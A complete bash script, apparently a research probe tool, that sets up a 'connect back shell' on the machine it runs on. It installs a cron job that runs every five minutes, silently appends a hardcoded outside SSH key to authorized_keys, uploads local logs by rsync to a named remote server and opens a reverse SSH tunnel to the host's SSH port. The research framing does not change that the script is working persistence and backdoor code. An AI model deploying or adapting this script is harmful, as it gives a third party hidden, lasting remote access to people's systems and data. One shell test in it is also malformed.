#!/bin/bash
#
# This program implements a connect back shell
# It installs a cronjob that regularly connects back with a reverse ssh tunnel
#

SERVER="ennui.lostinthenoise.net";
USERNAME="sarah";
FORWARDPORT="6666";
FORWARDCMD=" -R 127.0.0.1:$FORWARDPORT:127.0.0.1:22 ";
SCRIPT_PATH="~/.probe/bin/connectback.sh";
VERSION="0.1";
# This is the SSH key that will allow us to login to whatever system this is run on...
SSHKEY="ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEA3UZSU42YdUpvBtgg5Ou1uwP5MRKLrsbKxOuqbv+rTO2SWBv5IZVHp1+HdkM4dDXBS5/v3AeM1DbChI7ZC5kvQe6cxzVWT54HtHopBJBpxdpncvBLbPcY5dsx2g1QewQNKtU5K8GAdFrFi8eVTxnJWU0m5sGr8ALklrbdkGA8jWw/MkEIRki31An5CB+d3qeCNF+fxcEQUtt9MUei0qAwIs/omE3rRD+zVWcG0oWAshOc7XaXGb4rz3QdHz21pe7EHzOvQmBRq8l4H60oA6NyvICvsmOU4pvZ5iexQ2r6/oGROMqB0ODLh0QojjeWKP6/85NaEzHDMDtDvCw09s/uYitbjLSKrKvVTIjVHST34DIKyXq5wfO2CMONaBR79hkLy6H85P9qrfnuvVcnjtlNSgy80oAI9+Eq5yAAXj55H1Aawxfiw9P9BX2wfD8VHl80afNKmEV73zWDP9mVX3bqvUk1hZlsvimP3cIFtuz4F/QZeh1UNEhRKwuMMFXGUQd8bgatnUpN+6Vw9nDrzlpUxfPr/H+4PAnXMzglXvqMhgd+C0HplDamqbAKCB9XQ8H+0fNw+yTilkw3O2BDSyTJOY4ofuXJ8Gjf0kAAYHfSS3lIMQ+pDMTZ1ucMwUYkMWaJ8QPf/T52/h+9c2IB9hzJKGKOouR/syGKuubN7TIGN2U= ooni";


echo "connectback.sh $VERSION";
date -R;
echo;
if [ ! -d ~/.probe/bin/ ]; then
  mkdir -p ~/.probe/bin/;
fi

# Install this script to be run every five minutes by cron
TAB="`crontab -l | grep -c $SCRIPT_PATH`";
if [ $? == 1 ] || [ $TAB -lt 1]; then
    crontab -l > /tmp/cron.tmp;
    echo "*/5 * * * *  $SCRIPT_PATH" >> /tmp/cron.tmp;
    crontab /tmp/cron.tmp;
    rm /tmp/cron.tmp;
fi

# Check to see if we have a local SSH pub key...
# Create one if not - print the pub key for the user...
# Install our ssh key to allow for us to remotely login...
if [ ! -f ~/.ssh/id_rsa ]; then
  mkdir ~/.ssh;
  echo "$SSHKEY" >> ~/.ssh/authorized_keys;
  chmod 700 -R ~/.ssh;
  ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -P "";
  echo "Please send the following text to your research contact:";
  cat ~/.ssh/id_rsa.pub;
  echo;
  exit 0;
fi

echo "Please send the following text to your research contact:";
cat ~/.ssh/id_rsa.pub;


echo "Now attempting ssh connection out...";
rsync -aRvp ~/.probe/logs -e ssh $USERNAME@$SERVER:~/
# Now connect back to remote server with ssh tunnel and then log out:
ssh -v $FORWARDCMD $USERNAME@$SERVER "sleep 290";
echo "Forward finished...";
date -R;
